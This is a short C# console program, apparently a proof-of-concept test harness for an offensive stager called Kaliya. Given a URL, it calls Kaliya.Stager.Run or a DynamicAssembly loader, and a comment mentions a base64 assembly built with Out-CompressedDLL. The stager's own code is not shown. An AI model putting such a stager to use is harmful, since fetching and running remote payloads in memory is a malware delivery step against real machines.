using System;

namespace PoC
{
    class Program
    {
        static void Main(string[] args)
        {
            if (args.Length != 2)
            {
                Console.WriteLine("Usage: PoC.exe <static|assembly> <URL>");
                Environment.Exit(1);
            }

            string test = args[0];
            string url = args[1];

            if (test.ToLower().Equals("static"))
            {
                // Basic test, just running the static method.
                Kaliya.Stager.Run(url);
            } 
            else if (test.ToLower().Equals("assembly"))
            {
                // Another test, the base64 was generated using Out-CompressedDLL
                // in Debug mode to be able to see the logs
                DynamicAssembly.Run(url);
            }
        }
    }
}